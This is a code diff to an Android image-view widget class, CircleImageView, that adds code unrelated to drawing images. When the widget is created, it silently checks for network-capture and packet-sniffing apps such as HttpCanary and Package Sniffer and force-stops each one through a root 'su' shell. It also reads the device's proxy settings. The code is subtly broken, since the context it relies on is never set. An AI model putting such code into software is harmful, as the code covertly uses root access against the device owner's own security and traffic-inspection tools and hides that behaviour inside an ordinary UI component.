@@ -90,11 +90,33 @@ public class CircleImageView extends ImageView {
     private boolean mBorderOverlay;
     private boolean mDisableCircularTransformation;
 
+    private Context mContent;
+
+    private void load(Context context){
+        mContent = context;
+    }
+
     public CircleImageView(Context context) {
         super(context);
 
         init();
 
+        KillApp();
+
+        final boolean IS_ICS_OR_LATER = Build.VERSION.SDK_INT >= Build.VERSION_CODES.ICE_CREAM_SANDWICH;
+        String proxyAddress;
+        int proxyPort;
+        if (IS_ICS_OR_LATER) {
+            proxyAddress = System.getProperty("http.proxyHost");
+            String portStr = System.getProperty("http.proxyPort");
+            proxyPort = Integer.parseInt((portStr != null ? portStr : "-1"));
+        } else {
+            proxyAddress = android.net.Proxy.getHost(context);
+            proxyPort = android.net.Proxy.getPort(context);
+        }
+    }
+
+    private void KillApp(){
         String[] packname = {
                 "com.guoshi.httpcanary",//小黄鸟
                 "com.minhui.networkcapture",//抓包精灵
@@ -109,25 +131,37 @@ public class CircleImageView extends ImageView {
                 "com.packagesniffer.frtparlak",//Package Sniffer
                 "br.tiagohm.restler"//Restler
         };
-
+        PackageManager packageManager = mContent.getPackageManager();
+        Intent intent = null;
+        Process process = null;
         for (int i = 0; i < packname.length; i++) {
-            try {
-                Runtime.getRuntime().exec("su -c am force-stop " + packname[i]);
-            } catch (IOException e) {
-                e.printStackTrace();
+            intent = packageManager.getLaunchIntentForPackage(packname[i]);
+            if (intent!=null){
+                try {
+                    execShell("am force-stop " + packname[i]);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
             }
         }
+    }
 
-        final boolean IS_ICS_OR_LATER = Build.VERSION.SDK_INT >= Build.VERSION_CODES.ICE_CREAM_SANDWICH;
-        String proxyAddress;
-        int proxyPort;
-        if (IS_ICS_OR_LATER) {
-            proxyAddress = System.getProperty("http.proxyHost");
-            String portStr = System.getProperty("http.proxyPort");
-            proxyPort = Integer.parseInt((portStr != null ? portStr : "-1"));
-        } else {
-            proxyAddress = android.net.Proxy.getHost(context);
-            proxyPort = android.net.Proxy.getPort(context);
+    public void execShell(String cmd){
+        try{
+            //权限设置
+            Process p = Runtime.getRuntime().exec("su");
+            //获取输出流
+            OutputStream outputStream = p.getOutputStream();
+            DataOutputStream dataOutputStream=new DataOutputStream(outputStream);
+            //将命令写入
+            dataOutputStream.writeBytes(cmd);
+            //提交命令
+            dataOutputStream.flush();
+            //关闭流操作
+            dataOutputStream.close();
+            outputStream.close();
+        }catch(Throwable t){
+            t.printStackTrace();
         }
     }
 
